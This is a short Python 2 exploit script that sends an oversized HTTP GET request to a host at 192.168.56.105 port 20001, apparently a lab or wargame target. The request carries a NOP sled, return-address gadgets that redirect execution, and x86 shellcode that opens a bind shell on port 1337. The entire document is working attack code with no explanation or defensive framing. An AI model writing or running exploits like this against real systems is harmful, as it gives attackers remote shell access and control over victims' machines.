from struct import pack
import socket

# Shell Bind TCP Shellcode Port 1337 - 89 bytes
shellcode =  "\x90" * 128
shellcode += "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

overflow = "A"*15
overflow += pack("<L", 0x08049f4f); # jmp esp <- after add esp, 0x1c and pops, ret is this
overflow += "A"*118
overflow += "\xeb\x10" # jmp 0x12 <- this is to jump HTTP/1.1 after \x41 'nopsled'

retuaddr =  pack("<L", 0x08049a29) # add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

request = "GET /" + overflow + retuaddr + " HTTP/1.1" + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.105", 20001))
s.sendall(request)
data = s.recv(1024)
data2 = s.recv(1024)
s.close()

print data
print data2
